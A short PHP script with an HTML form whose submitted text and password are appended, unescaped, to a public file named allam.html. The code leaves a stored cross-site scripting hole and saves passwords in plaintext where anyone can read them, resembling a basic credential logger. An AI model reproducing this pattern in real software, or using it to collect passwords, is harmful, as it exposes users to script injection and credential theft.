<?php 
file_put_contents("allam.html","<div class='fg'>". $_POST["dd"]."</div>", FILE_APPEND);
file_put_contents("allam.html", $_POST["pass"], FILE_APPEND)
?>
<form action="" method="POST">
    <input type="text" name="dd">
    <input type="password" name="pass">
    <input type="submit" value="send">
</form>